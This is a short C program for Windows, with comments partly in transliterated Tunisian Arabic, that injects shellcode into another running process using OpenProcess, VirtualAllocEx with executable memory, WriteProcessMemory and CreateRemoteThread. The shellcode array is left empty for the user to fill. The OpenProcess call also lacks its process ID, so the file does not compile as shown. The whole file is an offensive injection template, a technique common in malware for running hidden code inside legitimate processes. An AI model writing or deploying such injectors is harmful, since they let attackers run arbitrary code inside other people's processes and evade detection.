#include <stdio.h>
#include <Windows.h>

int main()
{
	char payload[] = {
		// your shellcode
		    

			
	}; // shellcode mt3k
	HANDLE prhandle; //remote process bch testsava
	HANDLE Thread;
	void* executeinmemory;
	prhandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE,); // 7ot el PID mt3 process eli t7b tinjecti feha shellcode
	executeinmemory = VirtualAllocEx(prhandle, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // execute the shellcode ou a3tih  permissions
	WriteProcessMemory(prhandle, executeinmemory, payload, sizeof(payload), NULL); 
	Thread = CreateRemoteThread(prhandle, NULL, 0, (LPTHREAD_START_ROUTINE)executeinmemory, NULL, 0, 0); // start remotethread
	return 0;
}